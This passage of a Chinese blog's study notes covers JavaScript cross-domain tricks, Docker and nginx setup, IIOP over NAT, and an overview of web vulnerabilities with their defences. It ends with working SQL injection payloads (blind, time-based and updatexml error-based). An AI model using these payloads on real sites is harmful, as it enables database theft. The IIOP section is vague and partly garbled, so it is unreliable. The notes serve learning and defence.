document.getElementById(&#x27;myIframe&#x27;);\n        \n        // 重置 iframe 的 onload 事件程序，\n        // 此时经过后面代码重置 src 之后，\n        // http://www.laixiangran.cn/a.html 页面与该 iframe 在同一个源了，可以相互访问了\n        iframe.onload = function() &#123;\n            var data = iframe.contentWindow.name; // 4. 获取 iframe 里的 window.name\n            console.log(data); // hello world!\n        &#125;;\n        \n        // 3. 重置一个与 http://www.laixiangran.cn/a.html 页面同源的页面\n        iframe.src = &#x27;http://www.laixiangran.cn/c.html&#x27;;\n    &#125;\nscript>\n\n页面 http://laixiangran.cn/b.html 的代码：\n&lt;script type=&lt;script type=\"text/javascript\">\n    // 1. 给当前的 window.name 设置一个 http://www.laixiangran.cn/a.html 页面想要得到的数据值 \n    window.name = \"hello world!\";\n\n\nlocation.hash 跨域\n\n\n\n\n\n\n\n\nlocation.hash 方式跨域，是子框架修改父框架 src 的 hash 值，通过这个属性进行传递数据，且更改 hash 值，页面不会刷新。但是传递的数据的字节数是有限的。\n页面 http://www.laixiangran.cn/a.html 的代码：\n&lt;iframe src=&quot;http://laixiangran.cn/b.html&quot; id=&quot;myIframe&quot; onload=&quot;test()&quot; style=&lt;iframe src=&quot;http://laixiangran.cn/b.html&quot; id=&quot;myIframe&quot; onload=&quot;test()&quot; style=\"display: none;\">\nscript>\n    // 2. iframe载入 \"http://laixiangran.cn/b.html 页面后会执行该函数\n    function test() &#123;\n        // 3. 获取通过 http://laixiangran.cn/b.html 页面设置 hash 值\n        var data = window.location.hash;\n        console.log(data);\n    &#125;\nscript>\n\n页面 http://laixiangran.cn/b.html 的代码：\n&lt;script type=&lt;script type=\"text/javascript\">\n    // 1. 设置父页面的 hash 值\n    parent.location.hash = \"world\";\n\n\npostMessage 跨域\n\n\n\n\n\n\n\n\nwindow.postMessage(message，targetOrigin) 方法是 HTML5 新引进的特性，可以使用它来向其它的 window 对象发送消息，无论这个 window 对象是属于同源或不同源。这个应该就是以后解决 dom 跨域通用方法了。\n调用 postMessage 方法的 window 对象是指要接收消息的那一个 window 对象，该方法的第一个参数 message 为要发送的消息，类型只能为字符串；第二个参数 targetOrigin 用来限定接收消息的那个 window 对象所在的域，如果不想限定域，可以使用通配符 *。\n需要接收消息的 window 对象，可是通过监听自身的 message 事件来获取传过来的消息，消息内容储存在该事件对象的 data 属性中。\n页面 http://www.laixiangran.cn/a.html 的代码：\n&lt;iframe src=&quot;http://laixiangran.cn/b.html&quot; id=&quot;myIframe&quot; onload=&quot;test()&quot; style=&lt;iframe src=&quot;http://laixiangran.cn/b.html&quot; id=&quot;myIframe&quot; onload=&quot;test()&quot; style=\"display: none;\">\nscript>\n    // 1. iframe载入 \"http://laixiangran.cn/b.html 页面后会执行该函数\n    function test() &#123;\n        // 2. 获取 http://laixiangran.cn/b.html 页面的 window 对象，\n        // 然后通过 postMessage 向 http://laixiangran.cn/b.html 页面发送消息\n        var iframe = document.getElementById(&#x27;myIframe&#x27;);\n        var win = iframe.contentWindow;\n        win.postMessage(&#x27;我是来自 http://www.laixiangran.cn/a.html 页面的消息&#x27;, &#x27;*&#x27;);\n    &#125;\nscript>\n复制代码\n\n页面 http://laixiangran.cn/b.html 的代码：\n&lt;script type=&quot;text/javascript&quot;&gt;&lt;script type=&quot;text/javascript&quot;&gt;\n    // 注册 message 事件用来接收消息\n    window.onmessage = function(e) &#123;\n        e = e || event; // 获取事件对象\n        console.log(e.data); // 通过 data 属性得到发送来的消息\n    &#125;\nscript>\n\n参考资料\n\n\n\n\n\n\n\n\n\njs中几种实用的跨域方法原理详解\n跨域的那些事儿\n跨域资源共享 CORS 详解\n\n记一次docker搭建复现web题目环境1.构造镜像\n可以看到这里有个Dockerfile文件\n\n\n\n\n\n\n\n\n\ndocker build -t image_name .&#x2F;&#x2F;这里是利用dockerfile创建一个命名为image_name的镜像【后面的点不能少】\n\n2.查看镜像是否创建成功\n\n\n\n\n\n\n\n\ndocker images\n\n3.运行启动镜像，创建环境\n\n\n\n\n\n\n\n\ndocker run -i -d -P image_name \n\n4.查看容器启动端口\n\n\n\n\n\n\n\n\ndocker ps -a\n\n可以看到是再32768端口运行\n\n\n\n\n\n\n\n\n\n访问127.0.0.1:32768\n\n搭建成功\n5.关闭容器\n\n\n\n\n\n\n\n\ndocker ps -a\n\n\n\n\n\n\n\n\n\n\ndocker stop CONTAINER ID \n\n6.删除镜像【觉得环境镜像后面有用的可以留着】\n\n\n\n\n\n\n\n\ndocker images\n\n\n\n\n\n\n\n\n\n\ndocker rmi IMAGE ID\n&#x2F;&#x2F;注：有的需要强制，所以需要在后面加上参数-f\n\nps.进入容器环境\n\n\n\n\n\n\n\n\nsudo docker exec -it filechecker_pro_max_web1_1 /bin/bash#filechecker_pro_max_web1_1为容器名字\n\n反向代理和正向代理的区别正向代理和反向代理都是代理服务器的应用，它们的主要区别在于代理服务器的位置和作用：\n\n\n\n\n\n\n\n\n\n\n正向代理（Forward Proxy）：代理服务器位于客户端和目标服务器之间，代理服务器充当客户端的代表，向目标服务器发送请求并将响应返回给客户端。客户端向代理服务器发出请求，然后代理服务器将请求转发给目标服务器，最终将响应返回给客户端。正向代理主要用于访问外部网络或突破访问限制，客户端需要知道代理服务器的存在并向其发出请求。\n\n反向代理（Reverse Proxy）：代理服务器位于目标服务器和客户端之间，代理服务器充当目标服务器的代表，向目标服务器接收请求并将响应返回给客户端。客户端向代理服务器发出请求，代理服务器根据一定规则将请求转发到目标服务器上，并将目标服务器的响应返回给客户端。反向代理主要用于负载均衡、安全控制和缓存等方面，客户端不需要知道目标服务器的存在。\n\n\n总的来说，正向代理和反向代理都是代理服务器的应用，它们的主要区别在于代理服务器的位置和作用。\n\n\n\n\n\n\n\n\n\n正向代理是客户端向代理服务器发出请求，代理服务器再向目标服务器发送请求，并将响应返回给客户端；\n反向代理是客户端向代理服务器发出请求，代理服务器再将请求转发到目标服务器上，并将目标服务器的响应返回给客户端。\n以nginx为例，访问静态文件与php文件区别是什么？如何配置php文件的解析？\n\n\n\n\n\n\n\n\n在Nginx中，访问静态文件和PHP文件的处理方式有所不同。静态文件通常是指图片、CSS、JavaScript等不需要动态生成的文件，而PHP文件则是需要动态生成HTML内容的文件。\n\n\n\n\n\n\n\n\n\n对于静态文件的访问，Nginx可以直接返回这些文件，不需要对其进行任何处理，这可以提高Nginx的响应速度和性能。配置Nginx处理静态文件的方式通常如下：\nlocation /static &#123;\n    root /var/www/example.com;\n    index index.html;\n&#125;\n\n\n\n\n\n\n\n\n\n\n上面的配置表示，当访问&#x2F;example.com&#x2F;static时，Nginx会将请求映射到&#x2F;var&#x2F;www&#x2F;example.com&#x2F;static目录下，并返回该目录下的index.html文件（如果存在）。\n\n\n\n\n\n\n\n\n\n对于PHP文件的访问，Nginx需要将请求发送给PHP解释器进行处理，并将解析后的结果返回给客户端。为了实现这一功能，需要配置Nginx与PHP解释器之间的通信方式。通常，可以使用FastCGI协议来实现Nginx与PHP解释器之间的通信，具体配置方式如下：\nlocation / &#123;\n    root /var/www/example.com;\n    index index.php index.html;\n    try_files $uri $uri/ /index.php?$args;\n&#125;\n\nlocation ~ \\.php$ &#123;\n    fastcgi_pass unix:/run/php-fpm/php-fpm.sock;\n    fastcgi_index index.php;\n    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\n    include fastcgi_params;\n&#125;\n\n\n\n\n\n\n\n\n\n\n上面的配置表示，当访问&#x2F;example.com时，Nginx会首先查找该目录下是否存在请求的文件，如果存在则直接返回该文件，否则将请求转发到FastCGI服务，FastCGI服务会将请求发送给PHP解释器进行处理。其中，location ~ .php$ 表示匹配所有以.php结尾的请求，fastcgi_pass指定了PHP解释器的地址，SCRIPT_FILENAME指定了PHP解释器需要处理的文件路径。需要注意的是，需要安装PHP解释器和FastCGI服务，具体安装方式可以参考官方文档或其他资源。\nIIOP的NAT网络问题\n\n\n\n\n\n\n\n\nIIOP（Internet Inter-ORB Protocol）是一种用于不同计算机之间通信的协议，常用于分布式应用程序中。然而，在使用IIOP时，如果涉及到NAT（网络地址转换）网络，则可能会遇到一些问题。\nNAT是一种将私有IP地址转换为公共IP地址的技术，以实现在不同网络之间通信。但是，由于NAT会修改数据包的源地址和目标地址，因此可能会影响到IIOP通信的正确性和可靠性，\n具体表现为：\n\nIIOP请求无法到达目标机器：由于NAT会改变数据包的源IP地址，因此，当一个IIOP请求离开私有网络时，NAT会将源IP地址修改为公共IP地址。但是，由于IIOP协议中包含了源IP地址，因此，当响应返回时，如果源IP地址不是私有IP地址，则响应将无法到达目标机器，导致通信失败。\nIIOP响应无法到达源机器：类似地，当一个IIOP请求到达目标机器时，NAT会将目标IP地址修改为私有IP地址，以便将响应返回到源机器。但是，由于IIOP协议中包含了目标IP地址，因此，如果响应返回的目标IP地址不是公共IP地址，则响应无法到达源机器，导致通信失败。\nIIOP会话终止：如果一个IIOP会话的任一方在使用NAT网络时发生地址转换，那么会话可能会在NAT设备上终止，导致通信中断。\n\n为了解决这些问题，可以使用一些技术，例如端口映射、反向代理等，以确保IIOP请求和响应正确到达目标机器和源机器。\n那么可以根据网站编写的语言，用对应的语言对iiop的规则进行重写，以达到减少通讯冲突的结果\n以java和go对iiop的规则进行重写为例\n\n\n\n\n\n\n\n\n\nJava可以使用一些技术来重写IIOP规则，以确保IIOP在NAT网络中的正确性和可靠性。具体来说，以下是几种Java技术：\n\n使用Java Naming and Directory Interface (JNDI)：JNDI是Java中用于访问命名和目录服务的API。可以使用JNDI来连接到IIOP服务器，并通过命名服务的名称解析来避免在IIOP请求和响应中使用IP地址。这样可以减少NAT对IIOP请求和响应的影响。\n使用Java IIOP ORB属性：Java IIOP ORB属性是一组用于配置IIOP ORB的属性，包括IP地址和端口等。可以在代码中设置这些属性，以确保IIOP请求和响应正确到达目标机器和源机器。\n使用Java IIOP反向代理：Java IIOP反向代理是一种用于在公共网络上部署的IIOP服务器。反向代理可以将IIOP请求转发到私有网络中的IIOP服务器，以避免在IIOP请求和响应中使用IP地址。Java IIOP反向代理通常是基于Java IIOP ORB实现的。\n\n\n\n\n\n\n\n\n\n\nGo语言可以使用一些技术来重写IIOP规则，以确保IIOP在NAT网络中的正确性和可靠性。以下是几种Go技术：\n\n使用Go CORBA库：Go CORBA库是一组用于CORBA开发的Go语言库。可以使用Go CORBA库连接到IIOP服务器，并通过CORBA对象的名称解析来避免在IIOP请求和响应中使用IP地址。这样可以减少NAT对IIOP请求和响应的影响。\n使用Go IIOP反向代理：Go IIOP反向代理是一种用于在公共网络上部署的IIOP服务器。反向代理可以将IIOP请求转发到私有网络中的IIOP服务器，以避免在IIOP请求和响应中使用IP地址。Go IIOP反向代理通常是基于Go CORBA库实现的。\n使用Go TCP代理：Go TCP代理是一种用于在公共网络上部署的TCP服务器。可以将IIOP请求和响应通过TCP代理传输，并在代理服务器上进行地址转换，以确保IIOP请求和响应正确到达目标机器和源机器。\n\n可以以实际的情况用不同语言和方法进行修改以达到iiop与net冲突减少或者消失的目的\n","slug":"Noteless","date":"2022-05-30T16:15:39.751Z","categories_index":"web","tags_index":"daily","author_index":"Ttoc"},{"id":"3e7b4a90ecc2f84d20ae4150906de20d","title":"WEB学习","content":"学会一样东西，最重要特征就是可以把一个知识点的原理弄懂，造成一次成功注入，要注意分析源码当中导致这个漏洞的问题点，又应该如何改进与防御，\n不要急于求成，慢即是快，少即是多\n好记性不如烂笔头，一些知识点还是要多写几遍来记住，不是简单ctrl+c/+v就学到了，上机自己练习，打靶场，永远是最有效的方法，一定学会文章和实际操作密切结合，坚持做笔记\n学东西就只当学一次，一次学到最好，不要囫囵吞枣\n\n思路绝对不要被局限！！！\n\n\n基础漏洞知识\n\n\n\n\n\n\n\n\n–转载原文链接：https://blog.csdn.net/c_programj/article/details/117452836\n一、sql漏洞篇\n\n\n\n\n\n\n\n\nsql漏洞知识点记录\n1.sql漏洞原理指web应用程序对用户输入的数据合法性没有判断，导致攻击者可以构造不同的sql语句来对数据库数据库的操作。（web应用程序对用户输入的数据没有进行过滤，或者过滤不严，就把sql语句带进数据库中进行查询）。\n\n\n\n\n\n\n\n\n\nSql注入漏洞的产生需要满足两个条件：①参数用户可控：前端传给后端的参数内容是用户可以控制的。②参数代入数据库查询：传入的参数拼接到sql语句，且带入数据库查询。\n2.危害\n\n\n\n\n\n\n\n\n①数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。②网页篡改：通过操作数据库对特定网页进行篡改。③网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。④数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。⑤服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。⑥破坏硬盘数据，瘫痪全系统。\n3.防御\n\n\n\n\n\n\n\n\n①过滤危险字符：例如，采用正则表达式匹配union、sleep、load_file等关键字，如果匹配到，则退出程序。②使用预编译语句：使用PDO预编译语句，需要注意，不要将变量直接拼接到PDO语句中，而是使用占位符进行数据库的增加、删除、修改、查询。③特殊字符转义、使用严格的数据类型。\n二、xss漏洞篇1.xss漏洞原理恶意攻击者往Web页面里嵌入脚本代码（通常是JavaScript编写的恶意代码），当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。（恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去。）\n2.危害\n\n\n\n\n\n\n\n\n①盗取用户Cookie。②修改网页内容。③网站挂马。④利用网站重定向。⑤XSS蠕虫。\n3.防御\n\n\n\n\n\n\n\n\n①过滤输入的数据：包括” ’ ”、”&lt;”、“&lt;”、“&gt;”、“on”等非法字符。②对输出到页面的数据进行相应的编码转换，包括html实体编码、javascript编码等。\n三、csrf漏洞篇1.csrf漏洞原理因为web应用程序在用户进行敏感操作时，如修改账号密码、添加账号、转账等，没有校验表单token或者http请求头中的referer值（如果您在网页1，点击一个链接到网页2，当浏览器请求网页2时，网页1的URL就会包含在 Referer 头信息中），从而导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为。\n\nCsrf攻击过程两个重点：\n\n\n\n\n\n\n\n\n\n①目标用户已经登录了网站，能够执行网站的功能。②目标用户访问了攻击者构造的URL。\n2.危害\n\n\n\n\n\n\n\n\n①伪造HTTP请求进行未授权操作。②篡改、盗取目标网站上的重要用户数据。③未经允许执行对用户名誉或者资产有害的操作，比如：散播不良信息、进行消费等。④如果通过使用社工等方式攻击网站管理员、会危害网站本身的安全性。⑤作为其他攻击向量的辅助攻击手法，必须配合XSS⑥传播CSRF蠕虫\n3.防御\n\n\n\n\n\n\n\n\n①验证请求的referer值，如果referer是以自己的网站开头的域名，则说明该请求来自网站自己，是合法的。如果referer是其他网站域名或空白，就有可能是csrf攻击，那么服务器拒绝该请求，但是此方法存在被绕过的可能【brupsuite可以抓包修改referer从而绕过前端过滤】。②csrf攻击之所以能成功，是因为攻击者伪造用户的请求，所以抵御csrf的关键在于：在请求中放入攻击者不能伪造的请求，例如，可以在HTTP请求中加入一个随机产生的token，并在服务器端验证token【类似于验证码】，如果请求中没有token或者token内容不正确，则认为请求可能是csrf攻击，从而拒绝该请求。\n四、xxe漏洞篇1.xxe漏洞原理XML 外部实体攻击是针对解析 XML 输入的应用程序的一种攻击。当包含对外部实体的引用的 XML 输入由弱配置的 XML 解析器处理时，就会发生这种攻击。这种攻击可能导致机密数据泄露、拒绝服务、服务器端请求伪造、从解析器所在机器的角度进行端口扫描等系统影响。\n攻击可能包括使用系统标识符中的 file: 方案或相对路径公开本地文件，这些文件可能包含敏感数据，例如密码或私人用户数据。由于攻击发生与处理 XML 文档的应用程序相关，因此攻击者可能会使用此受信任的应用程序转向其他内部系统，可能通过 http(s) 请求泄露其他内部内容或对任何未受保护的内部服务发起 CSRF 攻击。在某些情况下，易受客户端内存损坏问题影响的 XML 处理器库可能会通过解除对恶意 URI 的引用而被利用，从而可能允许在应用程序帐户下执行任意代码。其他攻击可以访问可能不会停止返回数据的本地资源，\n一般来说，我们可以区分以下几种 XXE 攻击：\n\n\n\n\n\n\n\n\n\n\n典型注入：在这种情况下，外部实体包含在本地 DTD 中\n盲注：响应中没有显示输出和&#x2F;或错误\n报错注入：尝试在错误消息中获取资源的内容\n\nXML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。\n2.危害\n\n\n\n\n\n\n\n\n①读取任意文件。②执行系统命令。③探测内网端口。④攻击内网网站。\n3.防御\n\n\n\n\n\n\n\n\n①禁止使用外部实体，例如：PHP：libxml_disable_entity_loader(true)②过滤用户提交的xml数据，防止出现非法内容。\n五、ssrf漏洞篇1.ssrf漏洞原理大都是由于服务器提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。\n\n\n2.危害攻击者就可以利用该漏洞绕过防火墙等访问限制，进而将受感染或存在漏洞的服务器作为代理进行端口扫描，甚至是访问内部系统数据。\n\n\n\n\n\n\n\n\n\n1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner 信息\n2.攻击运行在内网或本地的应用程序\n3.对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)\n4.攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)\n5.下载内网资源(如：利用file协议读取本地文件等)\n6.进行跳板\n7.无视cdn\n8.利用Redis未授权访问，HTTP CRLF注入实现getshell\n3.防御\n\n\n\n\n\n\n\n\n① 限制请求的端口只能为web端口，只允许访问HTTP和HTTPS请求。② 限制不能访问内网的IP，以防止对内网进行攻击。③ 屏蔽返回的详细信息。④ 限制请求的端口为HTTP常用的端口，比如 80,443,8080,8088等。\n\n\n\n\n\n\n\n\n\nPHP中下面函数的使用不当会导致SSRF:\nfile_get_contents()\nfsockopen()#在PHP中fsockopen函数的作用是打开一个网络连接或者一个Unix套接字连接，其语法为“fsockopen($hostname) ”，返回值为一个文件句柄，之后可以被其他文件类函数调用\ncurl_exec()\n六、文件上传漏洞篇1.文件上传漏洞原理就是未对用户上传的文件进行检查和过滤，导致某些别有用心的用户上传了一些恶意代码或文件（asp、php、jsp等），从而控制了网站。（当文件上传时，如果服务端的脚本语言没有对上传的文件进行检查和过滤，那假如，渗透者直接上传恶意代码文件，那么就有可能直接控制整个网站，或者说以此为跳板，直接拿下服务器，这就是文件上传漏洞。）\n2.危害非法用户可以利用恶意脚本文件控制整个网站，甚至控制服务器。这个恶意脚本文件，又称为webshell，也可将webshell脚本称为一种网页后门，webshell脚本具有很强大的功能，比如查看服务器目录、服务器中的文件，执行绕过命令等。【用蚁剑或菜刀连接上传的 php文件，输入文件中的密码】\n3.防御\n\n\n\n\n\n\n\n\n①通过白名单方式判断文件后缀是否合法。②对上传的文件进行重命名。\n\n七、文件包含漏洞篇1.文件包含漏洞原理开发人员将需要重复调用的函数写入一个文件，对该文件进行包含是产生的操作。这样编写代码能减少代码冗余，降低代码后期维护难度，保证网站整体风格统一：导航栏、底部footer栏等。文件包含函数加载的参数没有经过过滤或严格定义，可以被用户控制，包含其他恶意文件，导致了执行非预期代码。\n2.危害\n\n\n\n\n\n\n\n\n①获取敏感信息②执行任意命令③获取服务器权限\n3.防御\n\n\n\n\n\n\n\n\n①建议白名单。②指定访问一定的路径，再将参数拼接到路径当中。\n\n八、逻辑漏洞漏洞篇1.逻辑漏洞漏洞原理指攻击者利用业务的设计缺陷，获取敏感信息或破坏业务的完整性。一般出现在密码修改、越权访问、密码找回、交易支付等功能处。\n2.危害任意密码修改、越权访问、密码任意找回、交易支付金额任意修改等\n3.防御1.任意密码修改2.越权访问越权访问漏洞产生主要原因是没有对用户的身份做判断和控制，防范这种漏洞时，可以通过session来控制。\n例如，在用户登录时，将username或uid写入到session（会话控制，Session对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的Web页之间跳转时，存储在Session对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。）中取出信息，而不是从GET或POST取出username，name此时取到的username就是没有篡改的。\n\n九、命令执行漏洞篇1.命令执行漏洞原理应用未对用户输入做严格的检查过滤，导致用户输入的参数被当成命令来执行。攻击者可以任意执行系统命令，属于高危漏洞之一，也属于代码执行的范畴。\n2.危害\n\n\n\n\n\n\n\n\n①继承web服务程序的权限去执行系统命令或读写文件。②反弹shell，获得目标服务器的权限。③进一步内网渗透。\n3.防御\n\n\n\n\n\n\n\n\n①尽量不要使用命令执行函数。②客户端提交的变量在进入执行命令函数前要做好过滤和检测。③在使用动态函数之前，确保使用函数是指定的函数之一。【防止攻击者引入新函数（非网站使用的函数）执行攻击语句】④对php语言而言，不能完全控制的危险函数最好不要使用。\n\n十、暴力破解篇1.暴力破解原理由于服务器端没有做限制，导致攻击者可以通过暴力手段破解所需信息，如用户名、密码、验证码等。暴力破解需要一个强大的字典，如4位数字的验证码，那么暴力破解的范围就是0000~9999，暴力破解的关键在于字典的大小。\n2.危害\n\n\n\n\n\n\n\n\n①用户密码被重置。②敏感目录、参数被枚举。③用户订单被枚举。\n3.防御\n\n\n\n\n\n\n\n\n① 如果用户登录次数超过设置的阈值，则锁定账号。② 如果某个IP登陆次数超过设置的阈值，则锁定IP。但存在一个问题，如果多个用户使用的是同一个IP，则会造成其他用户也不能登录。\n\n十一、Deserialization Vulnerabilities（PHP）1.Deserialization Vulnerabilities漏洞原理PHP反序列化漏洞也叫PHP对象注入，是一个非常常见的漏洞，这种类型的漏洞虽然有些难以利用，但一旦利用成功就会造成非常危险的后果。\n漏洞的形成的根本原因是程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果。反序列化漏洞并不是PHP特有，也存在于Java、Python等语言之中，但其原理基本相通。\nPHP类都含有几个特定的元素: 类属性、类常量、类方法。每一个类至少都含有以上三个元素，而这三个元素也可以组成最基本的类。那么按照特定的格式将这三个元素表达出来就可以将一个完整的类表示出来并传递。\n序列化就是将一个类压缩成一个字符串的方法\n2.危害未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。\n3.防御1)签名与认证如果序列化的内容没有用户可控参数，仅仅是服务端存储和应用，则可以通过签名认证，来避免应用接受黑客的异常输入。   \n2)限制序列化与反序列化的类增加一层序列化和反序列化接口类。这就相当于允许提供了一个白名单的过滤：只允许某些类可以被反序列化。只要你在反序列化的过程中，避免接受处理任何类型（包括类成员中的接口、泛型等），黑客其实很难控制应用反序列化过程中所使用的类，也就没有办法构造出调用链，自然也就很难利用反序列化漏洞了\n3)RASP检测（Runtime Application Self-Protection，实时程序自我保护）。RASP 通过 hook 等方式，在这些关键函数（例如：序列化，反序列化)的调用中，增加一道规则的检测。这个规则会判断应用是否执行了非应用本身的逻辑，能够在不修改代码的情况下对反序列化漏洞攻击实现拦截.\n4.利用1)__wakeup( )绕过(CVE-2016-7124)\n反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup( )的执行。\n2)注入对象构造方法当目标对象被private、protected修饰时的构造方法。\n3)Session反序列化漏洞PHP中的Session经序列化后存储，读取时再进行反序列化。\n4)PHAR利用PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，在PHP 5.3 或更高版本中默认开启，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。\n\n十二、rce漏洞篇1.rce漏洞原理一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 现在很多的企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞。 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 \n\n\n\n\n\n\n\n\n\n因此，如果需要给前端用户提供操作类的API接口（一般指应用程序的编程接口，主要目的是提供应用程序与开发人员以访问一组例程的能力，而又无需访问源码，或理解内部工作机制的细节），一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。\n2.危害RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。\n3.防御\n\n\n\n\n\n\n\n\n1)尽量不要使用命令执行函数。\n2)不要让用户控制参数。\n3)执行前做好检测和过滤。\n十三、ssti漏洞篇1.ssti漏洞原理推荐文章\nSSTI是一种注入类的漏洞，其成因也可以类比SQL注入SQL注入是从用户获得一个输入，然后用后端脚本语言进行数据库查询，利用输入来拼接我们想要的SQL语句。SSTI也是获取一个输入，然后在后端的渲染处理上进行语句的拼接执行。但是和SQL注入不同的，\nSSTI利用的是现有的网站模板引擎，主要针对Python、PHP、JAVA的一些网站处理框架，比如Python的jinja2、mako、tornado、Django，PHP的smarty twig，java的jade velocity。当这些框架对运用渲染函数生成html的时候，在过滤不严情况下，通过构造恶意输入数据，从而达到getshell或其他目的。\n\n\n\n\n\n\n\n\n\n一句话就是服务端在接收用户输入或用户可控参数后，未作处理或未进行严格过滤，直接嵌入模板渲染，导致执行恶意代码\n模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程， 服务端把用户输入的内容渲染成模板就可能造成SSTI(Server-Side Template Injection)\n模板渲染接受的参数需要用两个大括号&#123;  &#123;&#125;  &#125;括起来\n2.危害攻击者在服务器输入语句，服务端将其作为Web应用模板内容的一部分，在进行目标编译渲染的过程中，进行了语句的拼接，执行了所插入的恶意内容，从而导致信息泄露、代码执行、GetShell等问题\n3.防御\n\n\n\n\n\n\n\n\n1）和其他的注入防御一样，绝对不要让用户对传入模板的内容或者模板本身进行控制\n2）减少或者放弃直接使用格式化字符串结合字符串拼接的模板渲染方式，使用正规的模板渲染方法\n漏洞知识点记录笔记（一）\n\n\n\n\n\n\n\n\n补充一些知识点\n一、sqlsql注入的分类1.按照数据提交的方式来分类：  （1）GET 注入：提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接http://xxx.com/news.php?id=1 , id 是注入点。\n  （2）POST 注入：使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中(输入框)。\n  （3）Cookie 注入：HTTP请求的时候会带上客户端的Cookie, 注入点在Cookie当中的某个字段中。\n  （4）HTTP 头部注入：注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。\n2.按照执行效果来分类：（1）基于布尔的盲注\n\n\n\n\n\n\n\n\nbool盲注，即可以根据返回页面判断条件真假的注入。\n一般根据数据字符asiic码大小或字符长短，用二分法进行判断字符答案\n长度比如\n1 and length(database()) > 5\n\n\n\n\n\n\n\n\n\n\n意思就是判断数据库名大于5，如果返回假就在小于5里找，如果返回真，就在大于5范围里找，猜测到大概的长度的时候，可以用&#x3D;试试\n\n\n\n\n\n\n\n\n\n对于单一字符猜测，可以利用字母的ascii码，\n比如\n1 and ascii(substr(database(),1,1))>110\n\n\n\n\n\n\n\n\n\n\nsubstr是截取字符，如上就是从第一个字符截取，截取一个字符意思就是判断数据库名第一个字母的ascii码是否大于110，返回假就在小于110里找，返回真，就在大于110里找，最后可以用&#x3D;加以确定\n可以用burpsuite进行payload爆破，用数字字典，直接从0-127（ascii码共127位），然后根据回显，判断，就不用一个一个慢慢尝试\n强烈建议可以学习一下python，这样可以自己针对性的写一个脚本，效率更高\n（2）基于时间的盲注\n\n\n\n\n\n\n\n\n即不能根据页面返回内容判断任何信息，用条件语句（if）查看时间延迟语句（sleep()）是否执行（即页面返回时间是否增加）来判断。\n1 and if(length(database()>7,sleep(5),1)\n\n\n\n\n\n\n\n\n\n\n这里判断如果数据库名大于7，就延迟网页5s，反正没有延迟【就是执行1】，剩下的和bool盲注一样，挨个试试，推测出数据库名和其他数据\n时间盲注的函数或者方法\n\n\n\n\n\n\n\n\n\nsleep()\n\n**benchmark ()**：测定某些特定操作的执行速度，结果值总是0，仅仅会执行显示时间\n\nbenchmark (count,expr)，expr为执行表达式，count为执行次数\n常用语句\nSELECT BENCHMARK(100000000,(select database()));\n\n笛卡尔积：通过做大量的查询导致查询时间较长来达到延时的目的。通常选择一些比较大的表做笛卡尔积运算\n\n\n\n（3）基于报错注入\n\n\n\n\n\n\n\n\n即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。如：单引号、双引号、基于数字型注入。\n比如，查询数据库名\n-1 union select 1,updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1)\n\n *注意\n\n\n\n\n\n\n\n\n\nextractvalue和updatexml只显示32位字符\n所以爆出字符不全时，可以用left(xxx,length)和right(xxx,length)【注意0x7e也就是也算字符位，按上面例子用了两个，所以这里最多只能select 30个字符了，但左右都30，一共可以select 